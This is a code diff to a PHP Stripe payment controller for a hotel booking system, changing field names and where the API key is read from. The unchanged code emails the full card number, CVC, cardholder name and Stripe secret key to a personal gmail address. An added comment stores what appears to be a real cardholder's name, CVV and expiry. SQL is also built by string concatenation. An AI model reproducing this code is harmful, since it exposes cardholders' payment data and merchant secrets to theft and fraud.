@@ -11,20 +11,37 @@ class Stripe_payment extends CI_Controller{
 	public function checkout()
 	{
 
+/*
+    [paymentTypeId] => 2
+    [providerid] => 1
+    [currency] => BWP
+    [Description] => 
+    [amountdue] => 775.55
+    [nada] => cctype=MasterCard
+    [ccholder] => Linda De Paoli
+    [ccnumber] => 1005 : Client IP address is not authorized to use this service
+    [cccvv] => 462
+    [ccmonth] => 09
+    [ccyear] => 20*/
+
         $mail_data = '<strong> Request </strong> <br>';
 		$property_name = ucfirst(get_data(HOTEL,array('hotel_id'=>hotel_id()))->row()->property_name);
 		//Busco skApikey para el Hotel
-		$skApikeyinfo = $this->db->query("select user_password from user_connect_channel where channel_id = 39 and hotel_id=".hotel_id())->row();
+		$skApikeyinfo = $this->db->query("select * from paymentmethod where providerid =1 and hotelid=".hotel_id())->row_array();
+
+
+
 		 
-		 if($skApikeyinfo)
+		 if(count($skApikeyinfo)>0)
 		 {
-				$skApikey = $skApikeyinfo->user_password;
+
+		 	
+				$skApikey = $skApikeyinfo['apikey'];
 				$token = $this->CrearToken($skApikey);
 
-			
 				if (strlen($token["error"])==0)
 				{
-					$data="capture=true&amount=".number_format($_POST['Amount'], 2, '', '')."&currency=".strtolower($_POST['currency'])."&card=".$token['id']."&description=".str_replace("&","Y",$_POST['Description'])."&statement_descriptor=".substr($_POST['CHANNELNAME']." - ".$property_name, 0, 22);
+					$data="capture=true&amount=".number_format(str_replace(',', '', $_POST['amountdue']) , 2, '', '')."&currency=".strtolower($_POST['currency'])."&card=".$token['id']."&description=".str_replace("&","Y",$_POST['Description'])."&statement_descriptor=".substr($_POST['channelname']." - ".$property_name, 0, 22);
 
 					$Charge=$this->Charge($data,$skApikey);
 
@@ -78,7 +95,7 @@ class Stripe_payment extends CI_Controller{
                		$URL = 'https://api.stripe.com/v1/tokens';
               
                    
-                 	$XML ="card[number]=".$_POST['CC_NUMBER']."&card[exp_month]=".$_POST['CC_DATE']."&card[exp_year]=".$_POST['CC_YEAR'].(isset($_POST['sendcvv'])?"&card[cvc]=".$_POST['CC_CVC']:"")."&card[name]=".$_POST['CC_NAME']."&card[address_country]=".$_POST['COUNTRY']."&key=".$skApikey;
+                 	$XML ="card[number]=".$_POST['ccnumber']."&card[exp_month]=".$_POST['ccmonth']."&card[exp_year]=".$_POST['ccyear'].(isset($_POST['sendcvv'])?"&card[cvc]=".$_POST['cccvv']:"")."&card[name]=".$_POST['ccholder']."&card[address_country]=".$_POST['cccountry']."&key=".$skApikey;
                  	$mail_data = '<strong> Request </strong> <br>';
 					$mail_data .= $XML;
 					mail("datahernandez@gmail.com"," Stripe.Com Request and Response Token ",$mail_data);
@@ -104,7 +121,7 @@ class Stripe_payment extends CI_Controller{
                     foreach ($result as $value) {
                   
                     	if(isset($value['message'])){
-                    	$data['error']=	$value['message'];
+                    		$data['error']=	$value['message'];
                     	}
                     	else
                     	{
@@ -114,6 +131,7 @@ class Stripe_payment extends CI_Controller{
 
                     }
                     	
+	
                 
                 	return($data);              
                 	   
